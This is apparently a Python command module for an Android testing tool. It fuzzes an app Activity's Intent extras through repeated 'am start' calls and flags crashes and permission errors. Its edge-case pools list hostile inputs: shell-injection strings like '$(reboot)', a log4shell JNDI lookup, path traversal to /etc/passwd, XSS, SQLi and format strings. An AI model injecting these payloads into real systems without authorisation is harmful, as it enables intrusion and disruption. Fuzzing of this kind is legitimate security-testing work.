# commands/android/app_activity_fuzz.py
"""
app_activity_fuzz - drive an Activity with mutated Intent extras via
repeated 'am start' invocations.

The previous name 'app_ability_fuzz' (HarmonyOS-flavoured) is kept as an
alias for users coming from the HarmonyOS side of the tool.

V2 (C14) widens the mutator surface and adds outcome classification:

  * ?s -- string mode now mixes random ascii with a small pool of edge
    cases (empty, very long, NUL byte, RTL override, format string,
    traversal, SQLi-ish, XSS, emoji, shell-injection)
  * ?i -- int mode mixes random ints with INT_MIN / INT_MAX / 0 / +-1
    and byte / short boundaries
  * ?l -- new: long mode, LONG_MIN / LONG_MAX / 0 / +-1 boundaries
  * ?f -- new: float mode, 0.0 / -0.0 / NaN / Infinity / near-max double
  * ?u -- new: URI mode, http / file / content / javascript / intent
  * ?p -- new: path-traversal string
  * ?b -- boolean (unchanged)
  * ?  -- auto: pick a type randomly from the set above
  * <fixed>  any literal value the way V1 worked

Every iteration's am output is classified
  ANOMALY   one of SecurityException / AndroidRuntime / FATAL EXCEPTION
            / Process Crashed / IllegalArgumentException /
            NullPointerException / BadParcelableException / 'ANR ' /
            Permission Denial appears in stdout / stderr
  ERROR     non-zero exit with no markers
  OK        otherwise

A summary table prints at the end of the run; the top anomalies are
echoed back with their markers so the operator can re-run them by
hand.
"""

import json
import os
import random
import re
import string
import time
from typing import List, Optional, Tuple

from commands.base import Command, CommandSource


# ---------------------------------------------------------------------------
# Edge-case payload pools.  Sampled with probability _EDGE_PROB; otherwise
# the fuzzer falls back to its random generator for that type.
# ---------------------------------------------------------------------------

_EDGE_PROB = 0.45


_STRING_EDGE_CASES = (
    "",
    " ",
    "A",
    "A" * 4096,
    "A" * 65536,
    "\x00",
    "Hello\x00World",
    "‮",                  # RTL override
    "%n%s%s%s%s%s",            # format string
    "../../../../etc/passwd",
    "'\"\\;--",                # SQL/shell mix
    "<script>alert(1)</script>",
    "<?xml version='1.0'?><x/>",
    "%26%23%3B",               # double URL-encode of '&#;'
    "ÿþý",
    "💀🔥👻 spicy",
    "$(reboot)",
    "`reboot`",
    "{{7*7}}",                 # SSTI smell
    "${jndi:ldap://x.example/a}",  # log4shell smell
)

_INT_EDGE_CASES = (
    0, 1, -1,
    127, 128, -128, -129,                 # byte boundaries
    255, 256, -256,
    32767, 32768, -32768, -32769,         # short boundaries
    2147483647, -2147483648,              # int32 limits
    65535, 1048576, -1048576,
)

_LONG_EDGE_CASES = (
    *_INT_EDGE_CASES,
    9223372036854775807, -9223372036854775808,    # int64 limits
    9223372036854775806, -9223372036854775807,
    4294967295, -4294967295,                       # uint32 boundary
)

_FLOAT_EDGE_CASES = (
    "0.0", "-0.0",
    "1.0", "-1.0",
    "NaN", "Infinity", "-Infinity",
    "3.4028235E38",     # near float max
    "1.4E-45",          # near float min positive
    "1.7976931348623157E308",  # near double max
)

_URL_EDGE_CASES = (
    "http://",
    "https://x.example/",
    "file:///etc/passwd",
    "content://settings/secure",
    "content://media/external/images/media/1",
    "javascript:alert(1)",
    "intent://x#Intent;scheme=https;package=com.android.chrome;end",
    "tel:1234567890",
    "geo:0,0?q=secret",
)

_PATH_EDGE_CASES = (
    "../../../../etc/passwd",
    "/../../../../proc/self/cmdline",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "/data/local/tmp/x",
    "file:///proc/self/maps",
)


_ANOMALY_MARKERS = (
    "SecurityException",
    "AndroidRuntime",
    "FATAL EXCEPTION",
    "Process Crashed",
    "IllegalArgumentException",
    "NullPointerException",
    "BadParcelableException",
    "Permission Denial",
    "ANR ",   # leading space avoids accidental partial matches
)


def _classify(stdout: str, stderr: str, retcode: int) -> Tuple[str, List[str]]:
    combined = (stdout or "") + "\n" + (stderr or "")
    hit = [m for m in _ANOMALY_MARKERS if m in combined]
    if hit:
        return "ANOMALY", hit
    if retcode != 0:
        return "ERROR", []
    return "OK", []


# ---------------------------------------------------------------------------
# Mutators
# ---------------------------------------------------------------------------

_ALPHABET = string.ascii_letters + string.digits + "_-"


def _fuzz_string(base: Optional[str] = None, max_len: int = 32) -> str:
    """Mix a tiny mutational walk with the edge-case pool."""
    if random.random() < _EDGE_PROB:
        return random.choice(_STRING_EDGE_CASES)
    if not base:
        return "".join(
            random.choice(_ALPHABET)
            for _ in range(random.randint(1, max_len))
        )
    s = list(base)
    op = random.choice(("insert", "delete", "replace", "swap"))
    if op == "insert" and len(s) < max_len:
        s.insert(random.randrange(len(s) + 1), random.choice(_ALPHABET))
    elif op == "delete" and len(s) > 1:
        del s[random.randrange(len(s))]
    elif op == "replace" and s:
        s[random.randrange(len(s))] = random.choice(_ALPHABET)
    elif op == "swap" and len(s) > 1:
        i, j = random.sample(range(len(s)), 2)
        s[i], s[j] = s[j], s[i]
    return "".join(s)


def _fuzz_int() -> int:
    if random.random() < _EDGE_PROB:
        return random.choice(_INT_EDGE_CASES)
    return random.randint(-1_000_000, 1_000_000)


def _fuzz_long() -> int:
    if random.random() < _EDGE_PROB:
        return random.choice(_LONG_EDGE_CASES)
    return random.randint(-(2 ** 40), 2 ** 40)


def _fuzz_float() -> str:
    if random.random() < _EDGE_PROB:
        return random.choice(_FLOAT_EDGE_CASES)
    val = random.uniform(-1e6, 1e6)
    return f"{val:.6g}"


def _fuzz_uri() -> str:
    if random.random() < _EDGE_PROB:
        return random.choice(_URL_EDGE_CASES)
    return f"https://x.example/path/{_fuzz_string(max_len=16)}"


def _fuzz_path() -> str:
    if random.random() < _EDGE_PROB:
        return random.choice(_PATH_EDGE_CASES)
    return f"/data/local/tmp/{_fuzz_string(max_len=20)}"


def _fuzz_bool() -> str:
    return random.choice(("true", "false"))


def _infer_type(value: str) -> str:
    if value.lower() in ("true", "false"):
        return "bool"
    if re.fullmatch(r"-?\d+", value):
        return "int"
    return "string"


# Mode marker -> mode name.
_MODE_MARKERS = {
    "?s": "string", "?S": "string",
    "?i": "int",    "?I": "int",
    "?l": "long",   "?L": "long",
    "?f": "float",  "?F": "float",
    "?u": "uri",    "?U": "uri",
    "?p": "path",   "?P": "path",
    "?b": "bool",   "?B": "bool",
    "?":  "auto",
}


def _resolve_mode(raw_value: str) -> str:
    return _MODE_MARKERS.get(raw_value, "fixed")


_AUTO_CHOICES = ("string", "int", "long", "float", "uri", "path", "bool")


def _next_value(spec: dict) -> Tuple[str, str]:
    """Returns (value_as_str, am_type) where am_type is one of
    string / int / long / float / uri / bool."""
    mode = spec["mode"]
    if mode == "fixed":
        value = spec["fixed_value"] or ""
        return value, _infer_type(value)
    if mode == "auto":
        mode = random.choice(_AUTO_CHOICES)

    if mode == "string":
        v = _fuzz_string(spec.get("last_value"))
        spec["last_value"] = v
        return v, "string"
    if mode == "int":
        return str(_fuzz_int()), "int"
    if mode == "long":
        return str(_fuzz_long()), "long"
    if mode == "float":
        return _fuzz_float(), "float"
    if mode == "uri":
        return _fuzz_uri(), "uri"
    if mode == "path":
        return _fuzz_path(), "string"
    if mode == "bool":
        return _fuzz_bool(), "bool"
    return "", "string"  # never reached


_AM_EXTRA_FLAG = {
    "string": "--es",
    "int":    "--ei",
    "long":   "--el",
    "float":  "--ef",
    "bool":   "--ez",
    "uri":    "--eu",
}


# ---------------------------------------------------------------------------
# Command
# ---------------------------------------------------------------------------

class AndroidAppActivityFuzzCommand(Command):
    @property
    def name(self) -> str:
        return "app_activity_fuzz"

    @property
    def aliases(self) -> List[str]:
        # Back-compat: old muscle-memory + tab-completion still works.
        return ["app_ability_fuzz"]

    @property
    def supports_logging(self) -> bool:
        return True

    def help(self) -> str:
        return (
            "app_activity_fuzz <package> <activity> [--count N] [--delay ms]\n"
            "                   [--json] [--log] [key=value ...]   "
            "(alias: app_ability_fuzz)\n"
            "\n"
            "Fuzz an Activity's Intent extras via repeated 'am start' invocations.\n"
            "\n"
            "Fuzz markers in <value>:\n"
            "  ?s  fuzzed string (edge-case pool + mutational walk)\n"
            "  ?i  fuzzed int    (INT_MIN/MAX, byte/short boundaries, 0, +-1)\n"
            "  ?l  fuzzed long   (LONG_MIN/MAX boundaries)\n"
            "  ?f  fuzzed float  (NaN / Infinity / near-double-max)\n"
            "  ?u  fuzzed URI    (http / file / content / javascript / intent)\n"
            "  ?p  fuzzed path   (traversal payloads)\n"
            "  ?b  fuzzed bool\n"
            "  ?   auto: random type each iteration\n"
            "  any other value is passed verbatim (type inferred)\n"
            "\n"
            "Special keys: action= / data= / mime= / category=\n"
            "  (passed to 'am start' as -a / -d / -t / -c)\n"
            "\n"
            "Outcome classification per iteration:\n"
            "  ANOMALY  SecurityException / FATAL EXCEPTION / NullPointerException\n"
            "           / Process Crashed / Permission Denial / ANR ...\n"
            "  ERROR    am start exited non-zero with no marker hit\n"
            "  OK       clean run\n"
            "\n"
            "Examples:\n"
            "  app_activity_fuzz com.example.app .LoginActivity --count 100 username=?s password=?s\n"
            "  app_activity_fuzz com.example.app .DeepLinkActivity --count 200 url=?u page=?l\n"
            "  app_activity_fuzz com.example.app .SearchActivity --count 50 query=?s offset=?i --json"
        )

    # ------------------------------------------------------------------

    def execute(self, console, args: List[str], source: CommandSource) -> None:
        if not console.device_id:
            console._print_message("ERROR", "No Android device connected via adb.")
            return

        if len(args) < 2:
            console._print_message("INFO", self.help())
            return

        package, activity = args[0], args[1]
        if not re.match(r"^[a-zA-Z0-9._-]+$", package):
            console._print_message("ERROR", f"Invalid package: '{package}'")
            return

        if not activity.startswith(".") and "." not in activity:
            activity = "." + activity
        component = f"{package}/{activity}"

        count, delay_ms = 10, 0
        emit_json = False
        param_tokens: List[str] = []

        i = 2
        while i < len(args):
            tok = args[i]
            if tok == "--count" and i + 1 < len(args):
                try: count = max(1, int(args[i + 1]))
                except ValueError: pass
                i += 2
            elif tok == "--delay" and i + 1 < len(args):
                try: delay_ms = max(0, int(args[i + 1]))
                except ValueError: pass
                i += 2
            elif tok == "--json":
                emit_json = True; i += 1
            elif tok in ("--log",):  # accepted for back-compat; we always log
                i += 1
            else:
                param_tokens.append(tok)
                i += 1

        # Parse parameter specs
        param_specs: List[dict] = []
        for token in param_tokens:
            if "=" not in token:
                continue
            key, _, raw_value = token.partition("=")
            mode = _resolve_mode(raw_value)
            param_specs.append({
                "key":         key,
                "mode":        mode,
                "fixed_value": raw_value if mode == "fixed" else None,
                "last_value":  None,
            })

        # Log file
        log_file = None
        try:
            log_dir = os.path.join(os.getcwd(), "logs")
            os.makedirs(log_dir, exist_ok=True)
            ts = time.strftime("%Y%m%d_%H%M%S")
            safe = re.sub(r"[^a-zA-Z0-9_.-]", "_", f"{package}_{activity}")
            log_file = open(
                os.path.join(log_dir, f"app_activity_fuzz_{safe}_{ts}.log"),
                "w", encoding="utf-8",
            )
            log_file.write(
                f"# app_activity_fuzz android | package={package} "
                f"activity={activity}\n"
                f"# count={count} delay={delay_ms}ms\n\n"
            )
            console._print_message("INFO", f"Fuzzer log: {log_file.name}")
        except Exception as e:
            console._print_message("WARNING", f"Could not create log file: {e}")

        console._print_message(
            "INFO", f"Fuzzing {component} x {count} iterations ..."
        )
        start_time = time.time()

        summary = {"OK": 0, "ANOMALY": 0, "ERROR": 0}
        anomalies: List[dict] = []

        try:
            for iteration in range(1, count + 1):
                cmd = ["am", "start", "-n", component]

                for spec in param_specs:
                    key = spec["key"]
                    value, am_type = _next_value(spec)

                    if key == "action":
                        cmd += ["-a", value]
                    elif key == "data":
                        cmd += ["-d", value]
                    elif key == "mime":
                        cmd += ["-t", value]
                    elif key == "category":
                        cmd += ["-c", value]
                    else:
                        flag = _AM_EXTRA_FLAG.get(am_type, "--es")
                        cmd += [flag, key, value]

                if console.verbose:
                    console._print_message("DEBUG", " ".join(cmd))

                stdout, stderr, ret = console._run_shell(cmd)
                verdict, markers = _classify(stdout, stderr, ret)
                summary[verdict] += 1
                elapsed = time.time() - start_time

                if log_file:
                    ts_now = time.strftime("%Y-%m-%d %H:%M:%S")
                    log_file.write(
                        f"{ts_now} [+{elapsed:.3f}s] iter={iteration}/{count} "
                        f"verdict={verdict} ret={ret} cmd={' '.join(cmd)}\n"
                    )
                    if markers:
                        log_file.write(f"  markers: {', '.join(markers)}\n")
                    log_file.flush()

                if verdict == "ANOMALY":
                    anomalies.append({
                        "iter":    iteration,
                        "cmd":     list(cmd),
                        "markers": markers,
                    })
                    console._print_message(
                        "WARNING",
                        f"[{iteration}/{count}] ANOMALY: {', '.join(markers)}"
                    )
                elif verdict == "ERROR":
                    console._print_message(
                        "ERROR",
                        f"[{iteration}/{count}] am start failed (ret={ret})."
                    )

                if iteration < count and delay_ms > 0:
                    time.sleep(delay_ms / 1000.0)
        finally:
            if log_file:
                log_file.close()

        # --- Summary ---
        if emit_json:
            print(json.dumps({
                "package":   package,
                "activity":  activity,
                "iterations": count,
                "summary":   summary,
                "anomalies": anomalies,
            }, indent=2))
        else:
            print("")
            print("=" * 60)
            print(f"FUZZ SUMMARY  {component}")
            print("=" * 60)
            print(
                f"  Iterations : {count}  "
                f"OK={summary['OK']}  ANOMALY={summary['ANOMALY']}  "
                f"ERROR={summary['ERROR']}"
            )
            if anomalies:
                print(f"  Top anomalies (showing up to 10 of {len(anomalies)}):")
                for a in anomalies[:10]:
                    print(f"    iter {a['iter']}: {', '.join(a['markers'])}")
            print("=" * 60)


def register(registry_func):
    registry_func(AndroidAppActivityFuzzCommand())
